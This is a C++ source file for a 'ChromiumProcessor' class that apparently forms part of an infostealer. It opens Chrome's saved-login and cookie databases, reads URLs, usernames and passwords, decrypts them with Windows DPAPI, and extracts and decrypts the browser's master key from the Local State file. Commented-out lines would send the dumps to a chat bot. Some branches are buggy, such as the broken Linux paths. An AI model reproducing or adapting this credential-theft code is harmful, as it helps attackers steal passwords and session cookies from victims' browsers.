#include "chromium_processor.hpp"

ChromiumProcessor::ChromiumProcessor()
{
    prevMasterKey=nullptr;
#if defined(__WIN64__)
    string appDataLocal_path=std::experimental::filesystem::temp_directory_path().parent_path().parent_path().string();
    userdata_path=appDataLocal_path+string("\\Google\\Chrome\\User Data");
    pass_path=userdata_path+string("\\Default\\Login Data");
    cookies_path=userdata_path+string("\\Default\\Cookies");
#elif defined(__linux__)
    userdata_path=
    pass_path="~/.config/google-chrome/Default/User Data";
    cookies_path="~/.config/google-chrome/Default/Cookies";
#endif
}

stringstream ChromiumProcessor::getChromiumPW()
{
    stringstream dump(string(""));
    if(experimental::filesystem::exists(pass_path))
    {
        cout<<"exists"<<pass_path<<endl;

        int rc=sqlite3_open(pass_path.c_str(), &localDB);
        if(rc!=SQLITE_OK)
        {
            cerr<<"DB Error: "<<sqlite3_errmsg(localDB)<<endl;
            //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
        }
        else
        {
            //bot_sender.send(ChatID, pass.str());
        }
    }
    else
    {
        cerr<<"don't exists"<<pass_path<<endl;
        throw invalid_argument("wrong pass_path");
        return dump;
    }

    string sql="SELECT action_url, username_value, password_value FROM logins";

    sqlite3_stmt *pStmt;
    int rc, i;
    rc=sqlite3_prepare(localDB, sql.c_str(), -1, &pStmt, 0);
    if (rc!=SQLITE_OK)
    {
        dump<<"statement failed rc="<<rc<<endl;
        return dump;
    }

    rc=sqlite3_step(pStmt);
    //cout<<"RC: "<<rc<<endl;
    while(rc==SQLITE_ROW)
    {
        dump<<sqlite3_column_text(pStmt, 0)<<endl;
        dump<<(char *)sqlite3_column_text(pStmt, 1)<<endl;

        DATA_BLOB encryptedPass, decryptedPass;

        encryptedPass.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData=(byte *)malloc(encryptedPass.cbData);

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

        CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
        if(decryptedPass.pbData==nullptr || decryptedPass.cbData<1)
        {
            i=0;
            while(encryptedPass.pbData[i])
            {
                dump<<encryptedPass.pbData[i];
                i++;
            }
        }
        else
        {
            i=0;
            while(decryptedPass.pbData[i])
            {
                dump<<decryptedPass.pbData[i];
                i++;
            }
        }
        dump<<endl;
        free(encryptedPass.pbData);
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(localDB);
    cout<<dump.str();
    return dump;
}

stringstream ChromiumProcessor::getChromiumCookies()
{
    stringstream dump(string(""));
    if(experimental::filesystem::exists(cookies_path))
    {
        cout<<"exists "<<cookies_path<<endl;

        int rc=sqlite3_open(cookies_path.c_str(), &localDB);
        if(rc!=SQLITE_OK)
        {
            cout<<"DB Error: "<<sqlite3_errmsg(localDB)<<endl;
            //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
        }
        else
        {
            //bot_sender.send(ChatID, cookies.str());
        }
    }
    else
    {
        cerr<<"don't exists"<<cookies_path<<endl;
        throw invalid_argument("wrong cookies_path");
        return dump;
    }
    string sql="SELECT HOST_KEY, path, encrypted_value FROM cookies";
    sqlite3_stmt *pStmt;
    int rc;
    rc=sqlite3_prepare(localDB, sql.c_str(), -1, &pStmt, 0);
    if (rc!=SQLITE_OK)
    {
        dump<<"statement failed rc="<<rc<<endl;
        return dump;
    }
    cout<<endl;

    rc=sqlite3_step(pStmt);
    while(rc==SQLITE_ROW)
    {
        dump<<sqlite3_column_text(pStmt, 0)<<" ";
        dump<<(char *)sqlite3_column_text(pStmt, 1)<<" ";

        DATA_BLOB encryptedCookies;
        //DATA_BLOB decryptedCookies;

        encryptedCookies.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedCookies.pbData=(byte *)malloc(encryptedCookies.cbData);
        memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), encryptedCookies.cbData);

        string stCookie((char *)encryptedCookies.pbData);
        EasyDecrypt(stCookie, getMasterKey());
        if(stCookie==string(""))
        {
            stCookie=string((char *)encryptedCookies.pbData);
        }
/*
        CryptUnprotectData(&encryptedCookies, NULL, NULL, NULL, NULL, 0, &decryptedCookies);
        if(decryptedCookies.pbData==nullptr || decryptedCookies.cbData<1)
        {
            i=0;
            while(encryptedCookies.pbData[i])
            {
                dump<<encryptedCookies.pbData[i];
                i++;
            }
        }
        else
        {
            i=0;
            while(decryptedCookies.pbData[i])
            {
                dump<<decryptedCookies.pbData[i];
                i++;
            }
        }
*/
        dump<<endl;
        free(encryptedCookies.pbData);
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(localDB);
    cout<<dump.str();
    return dump;
}

unsigned char *ChromiumProcessor::getMasterKey()
{
    string LocalStateFile_path=userdata_path, stMasterKey;
    if(LocalStateFile_path.find("Opera")!=string::npos)
    {
        LocalStateFile_path += "\\Opera Stable\\Local State";
    }
    else
    {
        LocalStateFile_path += "\\Local State";
    }
    if(!experimental::filesystem::exists(LocalStateFile_path))
    {
        cerr<<"file don't exists: "<<LocalStateFile_path<<endl;
        return 0;
    }
    if (LocalStateFile_path!=prevBrowser_path)
    {
        prevBrowser_path=LocalStateFile_path;
    }
    else
    {
        return prevMasterKey;
    }
    json_error_t err;
    json_t *LocalState=json_load_file(LocalStateFile_path.c_str(), 0, &err);
    if(LocalState == NULL)
    {
        fprintf(stderr, "json file is incorrect: %s\n", LocalStateFile_path.c_str());
        fprintf(stderr, "error text: %s\n", err.text);
        return 0;
    }
    json_t *os_crypt=json_object_get(LocalState, "os_crypt");
    if(os_crypt == NULL)
    {
        fprintf(stderr, "error: have no 'os_crypt' object in JSON\n");
        return(0);
    }
    if(os_crypt->type == JSON_OBJECT)
    {
        if(json_object_get(os_crypt, "encrypted_key")->type == JSON_STRING)
        {
            stMasterKey=json_string_value(json_object_get(os_crypt, "encrypted_key"));
        }
    }

    stMasterKey=base64_decode(stMasterKey);
    fprintf(stdout, "Chromium MasterKey: '");
    for(unsigned long long int i=0; i<stMasterKey.length(); i++)
    {
        fprintf(stdout, "%.2x", stMasterKey.data()[i]&0xFF);
    }
    fprintf(stdout, "' (hex format, encrypted)\n");

    unsigned int len=stMasterKey.length()-5;
    char *bRawMasterKey=new char[len];
    memcpy(bRawMasterKey, stMasterKey.data()+5, len);

    DATA_BLOB finalK=DPAPIDecrypt((unsigned char *)(bRawMasterKey), len);
    if(finalK.cbData>0)
    {
        if(prevMasterKey!=nullptr)
        {
            delete [] prevMasterKey;
        }
        prevMasterKey=new unsigned char[finalK.cbData];
        memcpy(prevMasterKey, finalK.pbData, finalK.cbData);
    }

    fprintf(stdout, "Chromium MasterKey: '");
    for(unsigned long int i=0; i<finalK.cbData; i++)
    {
        fprintf(stdout, "%.2x", prevMasterKey[i]&0xFF);
    }
    fprintf(stdout, "' (hex format, decrypted)\n");

    delete[] bRawMasterKey;

    return prevMasterKey;
}
